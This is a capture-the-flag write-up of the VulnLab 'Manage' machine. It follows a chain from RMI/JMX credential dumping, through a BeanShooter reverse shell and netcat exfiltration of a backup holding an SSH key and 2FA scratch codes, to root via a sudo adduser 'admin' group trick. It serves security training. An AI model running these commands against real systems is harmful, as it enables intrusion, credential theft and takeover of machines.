---
icon: cherries
cover: ../../.gitbook/assets/backiee-114087-landscape.jpg
coverY: -388.585795097423
---

# VL-MANAGE

### Initial Reconnaissance

#### Scanning

First, let's perform a comprehensive port scan to identify all open services:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/MANAGE] 
└─$ nmap -sC -sV -p- -T4 10.10.225.123 ---- blahblah
```

The scan reveals the following services:

```
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a9:36:3d:1d:43:62:bd:b3:88:5e:37:b1:fa:bb:87:64 (ECDSA)
|_  256 da:3b:11:08:81:43:2f:4c:25:42:ae:9b:7f:8c:57:98 (ED25519)
2222/tcp  open  java-rmi   Java RMI
8080/tcp  open  http       Apache Tomcat 10.1.19
38133/tcp open  java-rmi   Java RMI
45591/tcp open  tcpwrapped
```

**Key Findings:**

* **SSH (Port 22)**: OpenSSH 8.9p1 - potential entry point if we find credentials
* **Java RMI (Ports 2222 & 38133)**: This is our primary attack vector - RMI services often expose management interfaces
* **Apache Tomcat (Port 8080)**: Version 10.1.19 - web application server that may have admin panels
* **Tcpwrapped (Port 45591)**: Unknown service, likely filtered

***

### Service Enumeration

#### Apache Tomcat (Port 8080)

Let's check what's running on the Tomcat server:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/MANAGE] 
└─$ curl http://10.10.225.123:8080
```

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/MANAGE] 
└─$ nikto -h http://10.10.225.123:8080
```

This reveals the Apache Tomcat default page. Tomcat commonly has manager applications at `/manager` and `/host-manager` endpoints that could provide deployment capabilities if we obtain credentials.

#### Java RMI Enumeration with BeanShooter

**What is Java RMI?** Java Remote Method Invocation (RMI) allows Java objects to invoke methods on objects running in different JVMs. However, misconfigurations can expose sensitive management interfaces like JMX (Java Management Extensions).

**Why is this vulnerable?** If RMI/JMX services are exposed without proper authentication or use default configurations, attackers can:

* Enumerate MBeans (Managed Beans)
* Extract credentials
* Execute arbitrary code through MBean manipulation

Let's download and use BeanShooter to enumerate the RMI service:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/MANAGE] 
└─$ wget https://github.com/qtc-de/beanshooter/releases/download/v4.1.0/beanshooter-4.1.0-jar-with-dependencies.jar
```

Now enumerate the RMI service:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/MANAGE] 
└─$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar enum 10.10.225.123 2222
```

**Output:**

```
[+] Enumerating tomcat users:
[+]
[+]     - Listing 2 tomcat users:
[+]
[+]             ----------------------------------------
[+]             Username:  manager
[+]             Password:  fhErvo2r9wuTEYiYgt
[+]             Roles:
[+]                        Users:type=Role,rolename="manage-gui",database=UserDatabase
[+]
[+]             ----------------------------------------
[+]             Username:  admin
[+]             Password:  onyRPCkaG4iX72BrRtKgbszd
[+]             Roles:
[+]                        Users:type=Role,rolename="role1",database=UserDatabase
```

**Critical Discovery!** We've extracted Tomcat credentials directly from the exposed RMI interface:

* `manager:fhErvo2r9wuTEYiYgt` (has manage-gui role)
* `admin:onyRPCkaG4iX72BrRtKgbszd` (has role1)

***

### Exploitation - Initial Access

#### Remote Code Execution via Java RMI

**Attack Explanation:** BeanShooter can abuse the `StandardMBean` functionality in JMX. By creating a malicious `TemplateImpl` object (from Apache Xalan XSLT processor), we can inject bytecode that executes when the MBean's methods are invoked. This triggers arbitrary code execution on the target.

**Setting up the attack:**

First, let's set up a listener on our attacking machine:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/MANAGE] 
└─$ nc -lvnp 4444
```

In another terminal, use BeanShooter's "tonka" module to deploy a reverse shell:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/MANAGE] 
└─$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.10.225.123 2222 tonka 10.10.14.23 4444
```

**What happens here?**

1. BeanShooter creates a malicious `TemplateImpl` payload object
2. It deploys this as a `StandardMBean` to the JMX server
3. When invoked, the payload triggers a reverse shell connection back to us
4. The NullPointerException is expected behavior - the attack still succeeds

**Alternative interactive shell approach:**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/MANAGE] 
└─$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar tonka shell 10.10.225.123 2222
```

This gives us an interactive shell as the `tomcat` user:

```
[tomcat@10.10.225.123 /]$ whoami
tomcat
[tomcat@10.10.225.123 /]$ id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
```

Let's stabilize our shell:

```
[tomcat@10.10.225.123 /]$ python3 -c 'import pty;pty.spawn("/bin/bash")'
tomcat@manage:/$ export TERM=xterm
tomcat@manage:/$ ^Z
[Background]
```

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/MANAGE] 
└─$ stty raw -echo; fg
```

***

### Post-Exploitation - Horizontal Privilege Escalation

#### System Enumeration

Let's enumerate the system to find privilege escalation vectors:

```
tomcat@manage:/$ cat /etc/passwd | grep -E '/bin/(bash|sh)'
root:x:0:0:root:/root:/bin/bash
useradmin:x:1002:1002:,,,:/home/useradmin:/bin/bash
```

We have a user called `useradmin`. Let's check their home directory:

```
tomcat@manage:/$ ls -la /home/useradmin/
total 40
drwxr-x--- 5 useradmin useradmin 4096 May 30  2024 .
drwxr-xr-x 3 root      root      4096 May 30  2024 ..
lrwxrwxrwx 1 root      root         9 May 30  2024 .bash_history -> /dev/null
-rw-r--r-- 1 useradmin useradmin  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 useradmin useradmin 3771 Jan  6  2022 .bashrc
drwxrwxr-x 2 useradmin useradmin 4096 May 30  2024 backups
-rw-r--r-- 1 useradmin useradmin  807 Jan  6  2022 .profile
drwx------ 2 useradmin useradmin 4096 May 30  2024 .ssh
-rw-r----- 1 root      useradmin   33 May 30  2024 user.txt
```

**Interesting findings:**

* A `backups` directory (world-readable!)
* A `.ssh` directory (likely contains private keys)
* `user.txt` flag (we'll need useradmin access to read it)

Let's check the backups directory:

```
tomcat@manage:/$ ls -la /home/useradmin/backups/
total 12
drwxrwxr-x 2 useradmin useradmin 4096 May 30  2024 .
drwxr-x--- 5 useradmin useradmin 4096 May 30  2024 ..
-rw-r--r-- 1 useradmin useradmin 2847 May 30  2024 backup.tar.gz
```

**Jackpot!** There's a backup file we can read. Let's exfiltrate it.

#### Data Exfiltration

Set up a listener on our attacking machine:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/MANAGE] 
└─$ nc -lvnp 1234 > backup.tar.gz
```

From the target, send the file:

```
tomcat@manage:/$ cd /home/useradmin/backups/
tomcat@manage:/home/useradmin/backups$ nc 10.10.14.23 1234 < backup.tar.gz
```

Back on our machine, extract the archive:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/MANAGE] 
└─$ tar -xvzf backup.tar.gz
./.ssh/
./.ssh/id_ed25519
./.ssh/id_ed25519.pub
./.google_authenticator
./.bash_logout
./.bashrc
./.profile
```

**Critical files extracted:**

* `.ssh/id_ed25519` - SSH private key for useradmin
* `.google_authenticator` - 2FA configuration file

Let's examine the Google Authenticator file:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/MANAGE] 
└─$ cat .google_authenticator
```

This file contains:

* The secret key for TOTP generation
* **Emergency scratch codes** (one-time backup codes)

#### SSH Access with 2FA Bypass

**Understanding the setup:** The server uses two-factor authentication (2FA) via Google Authenticator. However, the backup file contains emergency codes that can bypass the OTP requirement.

Set proper permissions on the SSH key:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/MANAGE] 
└─$ chmod 600 .ssh/id_ed25519
```

Attempt SSH connection:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/MANAGE] 
└─$ ssh useradmin@10.10.225.123 -i .ssh/id_ed25519
(useradmin@10.10.225.123) Verification code:
```

Use one of the emergency scratch codes from the `.google_authenticator` file:

```
(useradmin@10.10.225.123) Verification code: [EMERGENCY_CODE]
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)
...
useradmin@manage:~$
```

**Success!** We now have access as `useradmin`.

***

### Privilege Escalation to Root

#### Sudo Privileges Analysis

Check sudo permissions:

```
useradmin@manage:~$ sudo -l
Matching Defaults entries for useradmin on manage:
    env_reset, timestamp_timeout=1440, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User useradmin may run the following commands on manage:
    (ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$
```

**Analysis:**

* We can run `/usr/sbin/adduser` as root without a password
* The regex `^[a-zA-Z0-9]+$` restricts usernames to alphanumeric characters only
* This prevents us from adding arguments or performing command injection

**The Exploitation Strategy:**

Ubuntu's default `/etc/sudoers` configuration has a special rule:

```
useradmin@manage:~$ cat /etc/sudoers | grep admin
%admin ALL=(ALL) ALL
%sudo  ALL=(ALL:ALL) ALL
```

This means members of the `admin` group get full sudo privileges!

Check if the admin group exists:

```
useradmin@manage:~$ cat /etc/group | grep -i admin
useradmin:x:1002:
```

**Key Insight:** The `admin` group doesn't exist yet. When we create a user named "admin" using `adduser`, Ubuntu's default behavior will:

1. Create a new group with the same name as the username
2. Add the user to that group
3. This creates the `admin` group
4. The `/etc/sudoers` rule grants this group full sudo access

#### Exploitation

Create a user named "admin":

```
useradmin@manage:~$ sudo /usr/sbin/adduser admin
Adding user `admin' ...
Adding new group `admin' (1005) ...
Adding new user `admin' (1005) with group `admin' ...
Creating home directory `/home/admin' ...
Copying files from `/etc/skel' ...
New password: [SET_PASSWORD]
Retype new password: [SET_PASSWORD]
passwd: password updated successfully
Changing the user information for admin
Enter the new value, or press ENTER for the default
        Full Name []: 
        Room Number []: 
        Work Phone []: 
        Home Phone []: 
        Other []: 
Is the information correct? [Y/n] Y
```

Verify the admin group was created:

```
useradmin@manage:~$ cat /etc/group | grep admin
admin:x:1005:
useradmin:x:1002:
```

Check the admin user's groups:

```
useradmin@manage:~$ id admin
uid=1005(admin) gid=1005(admin) groups=1005(admin)
```

Switch to the admin user:

```
useradmin@manage:~$ su admin
Password: [ENTER_PASSWORD_SET_EARLIER]
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@manage:/home/useradmin$
```

Now escalate to root:

```
admin@manage:/home/useradmin$ sudo su
[sudo] password for admin: [ENTER_PASSWORD]
root@manage:/home/useradmin#
```

**Pwned!** We are now root.

***

### Attack Flow

```
┌──(sn0x㉿sn0x)-[~/HTB/MANAGE] 
└─$ cat attack_chain.txt

1. Initial Recon
   └─> Nmap scan reveals Java RMI (2222) and Tomcat (8080)

2. Java RMI Enumeration
   └─> BeanShooter extracts Tomcat credentials from JMX

3. Initial Access
   └─> BeanShooter StandardMBean exploitation
       └─> Reverse shell as 'tomcat' user

4. Horizontal Privilege Escalation
   └─> Found backup.tar.gz in /home/useradmin/backups/
       └─> Extracted SSH key and Google Authenticator config
           └─> Used emergency codes to bypass 2FA
               └─> SSH access as 'useradmin'

5. Vertical Privilege Escalation
   └─> sudo -l reveals /usr/sbin/adduser permission
       └─> Created user named 'admin' 
           └─> Ubuntu creates 'admin' group
               └─> /etc/sudoers grants admin group full sudo
                   └─> su admin → sudo su → ROOT!
```

***
